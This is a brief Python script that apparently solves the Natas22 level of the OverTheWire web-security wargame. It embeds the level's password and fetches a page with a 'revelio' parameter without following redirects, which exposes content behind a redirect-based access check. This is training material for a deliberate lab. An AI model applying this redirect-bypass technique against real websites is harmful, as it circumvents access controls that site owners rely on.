import requests

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?revelio".format(username)

response = session.get(url, auth=(username, password), allow_redirects=False)
content = response.text
print(content)
